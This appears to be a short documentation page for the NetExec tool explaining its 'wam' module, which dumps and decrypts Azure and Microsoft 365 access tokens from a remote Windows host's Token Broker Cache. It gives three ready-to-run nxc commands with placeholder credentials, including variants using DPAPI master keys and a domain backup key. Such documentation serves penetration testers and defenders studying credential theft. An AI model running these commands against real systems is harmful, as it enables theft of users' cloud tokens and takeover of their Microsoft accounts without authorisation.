---
description: Dump access token for Azure and Microsoft 365 from Token Broker Cache.
---

# 🆕 Dump Token Broker Cache

{% hint style="warning" %}
You need at least local admin privilege on the remote target, use option **--local-auth** if your user is a local account
{% endhint %}

Microsoft 365 and Azure applications on desktop will store access tokens to the Token Broker Cache. These are stored with user DPAPI. You can use the `wam` module in order to decrypt them. More info here [https://blog.xpnsec.com/wam-bam/](https://blog.xpnsec.com/wam-bam/)

```
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M wam
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M wam --mkfile masterkeys.txt
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' -M wam --pvk domain_backup_key.pvk
```

{% embed url="https://blog.xpnsec.com/wam-bam/" %}
